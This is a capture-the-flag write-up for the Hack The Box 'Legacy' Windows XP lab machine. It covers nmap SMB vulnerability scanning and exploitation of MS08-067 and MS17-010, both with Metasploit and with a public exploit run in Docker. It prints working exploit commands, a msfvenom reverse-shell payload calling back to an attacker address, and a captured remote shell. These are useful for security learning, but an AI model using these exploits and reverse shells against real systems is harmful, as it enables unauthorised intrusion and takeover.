# Legacy: 10.10.10.4

## Hints

- This machine is a great chance to test and learn about some very well known Windows SMB exploits
- Using `nmap` scripts will guide the way
- Metasploit makes this box a walk in the park

## nmap

Starting with the usual `nmap` scan. Interesting ports:

```none
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
```

## 80: Recon

Looking at the operating system - it is a relic...

```none
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
```

Windows XP and SMB ports... makes me think of going straight for some remote code execution exploits, for which `nmap` has some excellent scanners. To list the available SMB scripts in the vulnerability category:

```none
└─$ ls /usr/share/nmap/scripts/ | grep smb | grep vuln

smb2-vuln-uptime.nse
smb-vuln-conficker.nse
smb-vuln-cve2009-3103.nse
smb-vuln-cve-2017-7494.nse
smb-vuln-ms06-025.nse
smb-vuln-ms07-029.nse
smb-vuln-ms08-067.nse
smb-vuln-ms10-054.nse
smb-vuln-ms10-061.nse
smb-vuln-ms17-010.nse
smb-vuln-regsvc-dos.nse
smb-vuln-webexec.nse
```

And to run `nmap` with these scripts.

```none
nmap -Pn -v -script smb-vuln* -p 139,445 10.10.10.4
```

And the results.

```none
Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```

## MS08-067 with Metasploit

This is a real blast from the past. MS08-067 was the first exploit I ever used in the Metasploit Framework - about 10 years ago... maybe even more! Exploitation is straightforward.

```none
msfconsole
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.10.10.4
set LHOST 10.10.14.4
exploit
```

This gives us a remote shell with Administrator rights. I think it took me longer to figure out where the flag was on Windows XP, than to exploit the machine! 

```none
type "C:\Documents and Settings\john\Desktop\user.txt"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

## MS17-010 with Metasploit

Since I had not used Eternal Blue in `msfconsole`, though I would try (and document) the exploit.

```none
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 10.10.10.4
set LHOST 10.10.14.4

msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] 10.10.10.4:445 - Target OS: Windows 5.1
[*] 10.10.10.4:445 - Filling barrel with fish... done
[*] 10.10.10.4:445 - <---------------- | Entering Danger Zone | ---------------->
[*] 10.10.10.4:445 -    [*] Preparing dynamite...
[*] 10.10.10.4:445 -            [*] Trying stick 1 (x86)...Boom!
[*] 10.10.10.4:445 -    [+] Successfully Leaked Transaction!
[*] 10.10.10.4:445 -    [+] Successfully caught Fish-in-a-barrel
[*] 10.10.10.4:445 - <---------------- | Leaving Danger Zone | ---------------->
[*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x82236988
[*] 10.10.10.4:445 - Built a write-what-where primitive...
[+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.4:445 - Selecting native target
[*] 10.10.10.4:445 - Uploading payload... mxhfiscf.exe
[*] 10.10.10.4:445 - Created \mxhfiscf.exe...
[+] 10.10.10.4:445 - Service started successfully...
[*] Sending stage (175174 bytes) to 10.10.10.4
[*] 10.10.10.4:445 - Deleting \mxhfiscf.exe...
[*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.10.10.4:1031) at 2021-07-22 18:32:56 +1200

meterpreter >
```

Done! Metasploit is so easy with a discovered vulnerability. Lots of fun. But some other approaches, and learning something would be more fun.

## MS17-010 without Metasploit

Before we get started... this was a whirlwind adventure! Come along for the ride if you are interested in getting a stable and somewhat hassle-free environment to run the MS17-010 exploit! I had lots of problems along the way and resorted to a walkthrough that recommended a popular fork of the original `MS17-010` repo. This [fork was by a user named helviojunior](https://github.com/helviojunior/MS17-010), and provides a nice exploit. Kind of a "point-and-click", but without the Metasploit.

Let's just pretend for a second that we encounter no problems for the rest of this section, and can pass a reverse shell to the target. So, we should create said reverse shell. This is based on the instructions provided in the repo.

```none
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev.exe
```

At this point, I tried to get the exploit working and had numerous problems - mainly Python 2.7 errors, missing libraries, unavailable `impacket` etc., etc., etc. Went around and round trying to get Python, pip, and all the requirements working - with, and without, virtual environments. Eventually, I gave up, and let Docker do the hard lifting. I love this approach, being able to spin up a temporary container with only the essentials. And it means that other users can do the same steps - and get the same environment.

Start by installing Docker:

```none
sudo apt-get install docker
```

Then, like a good developer, setup up a folder structure for running a Docker container... In this case, my folder and container were called `cattime`.

```none
mkdir cattime
cd cattime
touch Dockerfile
echo "impacket==0.9.23" > requirements.txt
```

What we are doing is creating an empty `Dockerfile` to store the Docker configuration. And also adding `impacket` to the Python `requirements.txt` file - this makes it so we can download and install the `impacket` PyPi package in the container. In the `Dockerfile` I added the following content:

```none
FROM python:2.7-alpine
RUN apk --update --no-cache add \
    git \
    zlib-dev \
    musl-dev \
    libc-dev \
    gcc \
    libffi-dev \
    openssl-dev && \
    rm -rf /var/cache/apk/*

RUN mkdir -p /opt/cattime
COPY requirements.txt /opt/cattime
# This is funky
COPY rev.exe /opt/cattime
WORKDIR /opt/cattime
RUN pip install -r requirements.txt
```

A summary of what we are doing:

- `FROM python:2.7-alpine`: Use a slim Apline Linux image with Python 2.7.
- `RUN apk --update --no-cache add`: Install the `impacket` dependencies, as not much is on a default Apline Linux image. Also, install `git`.
- The remainder is setting `/opt/cattime` as our working directory and copying files across

One key thing - make sure `rev.exe` that you generated is in the directory that you are building the container. This entire container idea is based on this [Docker for Pentesters](https://blog.ropnop.com/docker-for-pentesters/#example-3---impacket) article which is awesome. There are about 10 examples to use Docker for pen-testing and CTF situations.

To be honest - we should probably be using a volume for things like adding `rev.exe` to the container - but I was in a rush. So, build the container using:

```none
sudo docker build -t cattime .
```

Start the container, and get a shell within the container:

```none
sudo docker run -it cattime /bin/sh
```

Download a good and easy ms-17-010 exploit using `git`:

```none
git clone https://github.com/helviojunior/MS17-010.git
```

Move into the freshly cloned repo, and run the exploit.

```none
cd MS17-010/
python send_and_execute.py 10.10.10.4 ../rev.exe 
```

Note how we reference the `rev.exe` shell in the above command. Which should be in the parent folder. Make sure to have a netcat lister set up:

```none
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.4] 1035
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

Done!

## Lessons Learned

- Don't forget about the awesome `nmap` scripts and keep learning about them
- Docker for setting up unusual environments is awesome and should be used more

## Useful Resources

- [HTB: Legacy by 0xdf](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html)
- [Hack The Box — Legacy Writeup w/o Metasploit by Rana Khalil](https://ranakhalil101.medium.com/hack-the-box-legacy-writeup-w-o-metasploit-2d552d688336)
